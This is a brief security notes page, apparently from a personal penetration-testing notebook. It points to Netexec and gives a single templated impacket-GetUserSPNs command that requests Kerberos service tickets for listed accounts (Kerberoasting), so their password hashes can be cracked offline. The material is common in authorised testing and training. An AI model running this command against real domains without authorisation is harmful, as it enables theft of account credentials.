---
tags:
  - security
---
Recommended to use [[Netexec|nxc]] instead.
```
impacket-GetUserSPNs -dc-ip $DCIP $DOMAIN"/"$USER":"$USERPASS -request -usersfile scope_kerberoastable
```